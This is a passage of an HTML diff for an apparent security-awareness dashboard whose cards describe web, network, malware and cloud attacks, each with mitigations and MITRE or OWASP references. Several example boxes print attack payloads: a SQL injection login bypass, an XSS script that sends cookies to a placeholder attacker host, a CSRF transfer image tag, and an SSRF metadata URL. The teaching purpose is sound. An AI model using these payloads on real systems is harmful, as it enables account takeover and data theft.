+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce Secure and HttpOnly cookie attribute flags</li>
+                                <li>Bind session tokens to device fingerprint profiles</li>
+                                <li>Implement short cookie session expire timeouts</li>
+                                <li>Monitor IP changes during active sessions</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Mitre Att&ck & Timeline</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1539 (Steal Web Session Cookie)</span></div>
+                                <div class="intel-col"><strong>Tactic</strong><span>Credential Access</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">SC</div><span>Sniff</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">ST</div><span>Steal</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">IM</div><span>Impersonate</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">EX</div><span>Exploit</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 2: APPLICATION-LAYER & WEB VULNERABILITIES -->
+        <section class="category-section" data-category="web" id="sec-web">
+            <div class="category-header">
+                <i class="fa-solid fa-code"></i>
+                <h2>Application-Layer & Web Vulnerabilities</h2>
+            </div>
+            <div class="threat-grid">
+                
+                <!-- Card 1 -->
+                <article class="threat-card" data-severity="Critical" data-category="web">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-database"></i>
+                            <h3>SQL Injection (SQLi)</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Unsanitized parameters passed into user inputs are executed by database servers as commands.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Example</strong>
+                        <p>Bypassing credentials panels by inputting <code>' OR 1=1 --</code> in form username blocks.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce prepared parameterized query templates</li>
+                                <li>Filter input fields against regex patterns</li>
+                                <li>Restrict database user privilege attributes</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">OWASP & Flow Visualization</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>OWASP ID</strong><span>A03:2021-Injection</span></div>
+                                <div class="intel-col"><strong>Severity</strong><span>Critical (9.8 CVSS)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">Input Field ---> Web App (No Escape) ---> SQL Execute ---> Leaked DB</div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 2 -->
+                <article class="threat-card" data-severity="High" data-category="web">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-bug"></i>
+                            <h3>Cross-Site Scripting (XSS)</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Attackers inject malicious client-side JavaScript payloads into pages loaded by other user browsers.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Example</strong>
+                        <p>Posting comment posts containing <code>&lt;script&gt;fetch(attacker_ip + document.cookie)&lt;/script&gt;</code> to hijack sessions.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Sanitize output variables with HTML Entity encoding</li>
+                                <li>Deploy strict Content Security Policy headers</li>
+                                <li>Store sessions cookies as HttpOnly</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">OWASP & Flow Visualization</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>OWASP ID</strong><span>A03:2021-Injection</span></div>
+                                <div class="intel-col"><strong>Severity</strong><span>High (8.2 CVSS)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">Injected Script ---> Stored in DB ---> User Browser ---> Cookie Stolen</div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 3 -->
+                <article class="threat-card" data-severity="Critical" data-category="web">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-circle-user"></i>
+                            <h3>Broken Object Level Authorization (BOLA / IDOR)</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        API handlers fail to verify user resource access rights when processing variable IDs in request parameters.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Example</strong>
+                        <p>Changing API call endpoint targets from <code>/invoice/1001</code> to <code>/invoice/1002</code> to inspect other records.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce session ownership validation checkpoints</li>
+                                <li>Utilize complex non-sequential UUID parameters</li>
+                                <li>Perform automated API test access scans</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">OWASP & Flow Visualization</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>OWASP ID</strong><span>A01:2021-Broken Access Control</span></div>
+                                <div class="intel-col"><strong>Severity</strong><span>Critical (9.4 CVSS)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">Change API ID ---> Send request ---> No Auth Check ---> Leak Data</div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 4 -->
+                <article class="threat-card" data-severity="Critical" data-category="web">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-route"></i>
+                            <h3>Server-Side Request Forgery (SSRF)</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        A web application is forced to dispatch server requests targeting internal files or metadata systems.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Example</strong>
+                        <p>Passing <code>http://169.254.169.254/latest/meta-data/</code> to cloud document builders to leak credentials.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce URL destination domain whitelists</li>
+                                <li>Restrict HTTP redirections in curl requests</li>
+                                <li>Isolate backend microservices inside private networks</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">OWASP & Flow Visualization</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>OWASP ID</strong><span>A10:2021-Server-Side Request Forgery</span></div>
+                                <div class="intel-col"><strong>Severity</strong><span>Critical (9.1 CVSS)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">Client Payload ---> Web App Server ---> Query metadata ---> Leak Keys</div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 5 -->
+                <article class="threat-card" data-severity="Medium" data-category="web">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-envelope-open"></i>
+                            <h3>Cross-Site Request Forgery (CSRF)</h3>
+                        </div>
+                        <span class="sev-badge medium">Medium</span>
+                    </div>
+                    <div class="threat-desc">
+                        Tricking authenticated client browsers into sending unauthorized state-changing requests to vulnerable web portals.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Example</strong>
+                        <p>Inserting <code>&lt;img src="http://bank.com/transfer?to=attacker&amp;amount=1000"&gt;</code> in forums to trigger cash transfers.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce random session-bound Anti-CSRF tokens</li>
+                                <li>Configure SameSite cookie attributes (Strict/Lax)</li>
+                                <li>Implement secondary re-auth checks for payments</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">OWASP & Flow Visualization</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>OWASP ID</strong><span>A01:2021-Broken Access Control</span></div>
+                                <div class="intel-col"><strong>Severity</strong><span>Medium (6.5 CVSS)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">User active ---> Visits Bad Site ---> Auto-Sends Action ---> Executed</div>
+                        </div>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 3: NETWORK & INFRASTRUCTURE ATTACKS -->
+        <section class="category-section" data-category="network" id="sec-network">
+            <div class="category-header">
+                <i class="fa-solid fa-network-wired"></i>
+                <h2>Network & Infrastructure Attacks</h2>
+            </div>
+            <div class="threat-grid">
+                
+                <!-- Card 1 -->
+                <article class="threat-card" data-severity="Critical" data-category="network">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-triangle-exclamation"></i>
+                            <h3>DDoS (Distributed Denial of Service)</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        A network of compromised nodes floods host ports or processing capacity to trigger system downtime outages.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Extended operational service crashes and financial loss due to system unavailability.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Implement edge rate limit throttling</li>
+                                <li>Use Cloudflare CDN proxy caches</li>
+                                <li>Deploy packet scrubbing center nodes</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> View Flow
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Attack Flow Diagram</div>
+                            <svg class="threat-svg-diagram" viewBox="0 0 300 70">
+                                <path d="M 30 15 L 140 35" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,4" />
+                                <path d="M 30 35 L 140 35" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,4" />
+                                <path d="M 30 55 L 140 35" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,4" />
+                                <path d="M 160 35 L 260 35" stroke="#ef4444" stroke-width="2" />
+                                
+                                <circle cx="30" cy="15" r="8" fill="#ef4444" />
+                                <circle cx="30" cy="35" r="8" fill="#ef4444" />
+                                <circle cx="30" cy="55" r="8" fill="#ef4444" />
+                                <rect x="130" y="20" width="30" height="30" fill="#0f172a" stroke="#fff" stroke-width="1" />
+                                <circle cx="260" cy="35" r="10" fill="#050816" stroke="#ef4444" stroke-width="2" />
+                                
+                                <text x="145" y="38" fill="#fff" font-size="8" text-anchor="middle">Firewall</text>
+                                <text x="260" y="38" fill="#fff" font-size="8" text-anchor="middle">Target</text>
+                            </svg>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 2 -->
+                <article class="threat-card" data-severity="High" data-category="network">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-shuffle"></i>
+                            <h3>Man-in-the-Middle (MitM)</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Threat actors intercept and alter network communications between two machines silently.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Stealing sensitive credentials, private communication leakage, and transaction defacement.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce SSL/TLS encryption across all APIs</li>
+                                <li>Use HTTP Strict Transport Security (HSTS)</li>
+                                <li>Ban usage of unencrypted public Wi-Fi profiles</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> View Flow
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Attack Flow Diagram</div>
+                            <svg class="threat-svg-diagram" viewBox="0 0 300 70">
+                                <path d="M 30 20 L 150 50" stroke="#ef4444" stroke-width="1.5" />
+                                <path d="M 150 50 L 260 20" stroke="#ef4444" stroke-width="1.5" />
+                                <path d="M 30 20 L 260 20" stroke="#10b981" stroke-width="1" stroke-dasharray="3,3" />
+                                
+                                <circle cx="30" cy="20" r="10" fill="#000" stroke="#10b981" stroke-width="2" />
+                                <circle cx="150" cy="50" r="10" fill="#000" stroke="#ef4444" stroke-width="2" />
+                                <circle cx="260" cy="20" r="10" fill="#000" stroke="#10b981" stroke-width="2" />
+                                
+                                <text x="30" y="23" fill="#fff" font-size="8" text-anchor="middle">Client</text>
+                                <text x="150" y="53" fill="#fff" font-size="8" text-anchor="middle">Attacker</text>
+                                <text x="260" y="23" fill="#fff" font-size="8" text-anchor="middle">Server</text>
+                            </svg>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 3 -->
+                <article class="threat-card" data-severity="High" data-category="network">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-network-wired"></i>
+                            <h3>DNS Spoofing / Cache Poisoning</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Injecting malicious name server cache values to redirect requests to clone phishing pages.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Redirection of web traffic to clone portals to capture login tokens and credit card details.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce Domain Name System Security Extensions (DNSSEC)</li>
+                                <li>Restrict recursive queries on DNS infrastructure</li>
+                                <li>Configure encrypted DNS routing (DoH/DoT)</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> View Flow
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Attack Flow Diagram</div>
+                            <svg class="threat-svg-diagram" viewBox="0 0 300 70">
+                                <path d="M 30 35 L 140 35" stroke="#ef4444" stroke-width="1.5" />
+                                <path d="M 160 35 L 260 15" stroke="#ef4444" stroke-width="1.5" />
+                                <path d="M 160 35 L 260 55" stroke="#10b981" stroke-width="1" stroke-dasharray="3,3" />
+                                
+                                <circle cx="30" cy="35" r="10" fill="#000" stroke="#38bdf8" stroke-width="2" />
+                                <rect x="130" y="20" width="30" height="30" fill="#050816" stroke="#f59e0b" stroke-width="1.5" />
+                                <circle cx="260" cy="15" r="8" fill="#ef4444" />
+                                <circle cx="260" cy="55" r="8" fill="#10b981" />
+                                
+                                <text x="30" y="38" fill="#fff" font-size="8" text-anchor="middle">User</text>
+                                <text x="145" y="38" fill="#fff" font-size="8" text-anchor="middle">DNS</text>
+                                <text x="260" y="18" fill="#fff" font-size="7" text-anchor="middle">Fake</text>
+                                <text x="260" y="58" fill="#fff" font-size="7" text-anchor="middle">Real</text>
+                            </svg>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 4 -->
+                <article class="threat-card" data-severity="Medium" data-category="network">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-wifi"></i>
+                            <h3>Rogue Access Points</h3>
+                        </div>
+                        <span class="sev-badge medium">Medium</span>
+                    </div>
+                    <div class="threat-desc">
+                        Malicious operators spin up rogue Wi-Fi signals in office perimeters to capture corporate packets.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Intercepting plaintext traffic logs and session cookies of client devices within Wi-Fi ranges.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Mitigations <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Enforce Wireless Intrusion Prevention Systems (WIPS)</li>
+                                <li>Perform periodic hardware frequency audits</li>
+                                <li>Mandate enterprise VPN connections for all clients</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> View Flow
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Attack Flow Diagram</div>
+                            <svg class="threat-svg-diagram" viewBox="0 0 300 70">
+                                <path d="M 30 35 L 140 35" stroke="#ef4444" stroke-width="1.5" />
+                                <path d="M 160 35 L 260 35" stroke="#ef4444" stroke-width="1.5" />
+                                
+                                <circle cx="30" cy="35" r="10" fill="#000" stroke="#38bdf8" stroke-width="2" />
+                                <circle cx="150" cy="35" r="10" fill="#000" stroke="#ef4444" stroke-width="2" />
+                                <circle cx="260" cy="35" r="10" fill="#000" stroke="#10b981" stroke-width="2" />
+                                
+                                <text x="30" y="38" fill="#fff" font-size="7" text-anchor="middle">Client</text>
+                                <text x="150" y="38" fill="#fff" font-size="7" text-anchor="middle">Evil Twin</text>
+                                <text x="260" y="38" fill="#fff" font-size="7" text-anchor="middle">Gateway</text>
+                            </svg>
+                        </div>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 4: MALWARE & SYSTEM EXPLOITATION -->
+        <section class="category-section" data-category="malware" id="sec-malware">
+            <div class="category-header">
+                <i class="fa-solid fa-skull-crossbones"></i>
+                <h2>Malware & System Exploitation</h2>
+            </div>
+            <div class="threat-grid">
+                
+                <!-- Card 1 -->
+                <article class="threat-card" data-severity="Critical" data-category="malware">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-lock"></i>
+                            <h3>Ransomware</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Malware encrypts client storage systems and requests cryptocurrency transfer to deliver the decryption keys.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Complete halt of corporate operations, permanent data loss, and extortion payloads.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Playbook <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Isolate infected systems instantly from networks</li>
+                                <li>Maintain daily off-site offline backups</li>
+                                <li>Restrict administrative installation actions</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Threat Timeline & Lifecycle</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1486 (Data Encrypted for Impact)</span></div>
+                                <div class="intel-col"><strong>Kill Chain Phase</strong><span>Actions on Objectives</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">IA</div><span>Access</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">PL</div><span>Payload</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">EN</div><span>Encrypt</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">RN</div><span>Ransom</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 2 -->
+                <article class="threat-card" data-severity="Critical" data-category="malware">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-clock"></i>
+                            <h3>Zero-Day Exploitation</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Targeted exploit launches targeting system vulnerabilities before software vendors release patches.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Undetected silent system penetration and remote code execution bypass checkpoints.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Playbook <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Configure heuristics and behavior logging analysis</li>
+                                <li>Segment vital servers behind closed networks</li>
+                                <li>Enforce application execution whitelists</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Threat Timeline & Lifecycle</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1190 (Exploit Public-Facing Application)</span></div>
+                                <div class="intel-col"><strong>Kill Chain Phase</strong><span>Exploitation</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">DS</div><span>Discover</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">DV</div><span>Develop</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">SL</div><span>Silent</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">PT</div><span>Patch</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 3 -->
+                <article class="threat-card" data-severity="High" data-category="malware">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-memory"></i>
+                            <h3>Buffer Overflow</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        A memory writing process overflows stack variables to hijack memory registers and trigger code execution loops.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Application crashes, privilege hijack, and execution of arbitrary attacker shellcode.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Playbook <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Compile with ASLR and DEP memory protection</li>
+                                <li>Enforce strict string inputs validation length</li>
+                                <li>Use safe memory function libraries (e.g. strncpy)</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Threat Timeline & Lifecycle</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1203 (Exploitation for Client Execution)</span></div>
+                                <div class="intel-col"><strong>Kill Chain Phase</strong><span>Exploitation</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">OV</div><span>Overflow</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">HJ</div><span>Hijack</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">NS</div><span>NOP Sled</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">SC</div><span>Shell</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 4 -->
+                <article class="threat-card" data-severity="Critical" data-category="malware">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-link-slash"></i>
+                            <h3>Supply Chain Attacks</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Threat actors inject malicious code updates inside third-party dependency libraries to compromise end clients.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Real World Impact</strong>
+                        <p>Widespread silent intrusion vectors across client networks through trusted signed software channels.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Defensive Playbook <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Perform automated Software Composition Analysis (SCA)</li>
+                                <li>Audit code signatures and file hashes of imports</li>
+                                <li>Establish strict offline build system profiles</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Intel details
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Threat Timeline & Lifecycle</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Technique</strong><span>T1195 (Supply Chain Compromise)</span></div>
+                                <div class="intel-col"><strong>Kill Chain Phase</strong><span>Delivery</span></div>
+                            </div>
+                            <div class="killchain-track">
+                                <div class="killchain-node active"><div class="killchain-dot">VB</div><span>Vendor</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">PM</div><span>Poison</span></div>
+                                <div class="killchain-node active"><div class="killchain-dot">SB</div><span>Signed</span></div>
+                                <div class="killchain-node"><div class="killchain-dot">CI</div><span>Install</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+        <!-- SECTION 5: CLOUD & VIRTUALIZATION ATTACKS -->
+        <section class="category-section" data-category="cloud" id="sec-cloud">
+            <div class="category-header">
+                <i class="fa-solid fa-cloud"></i>
+                <h2>Cloud & Virtualization Attacks</h2>
+            </div>
+            <div class="threat-grid">
+                
+                <!-- Card 1 -->
+                <article class="threat-card" data-severity="Critical" data-category="cloud">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
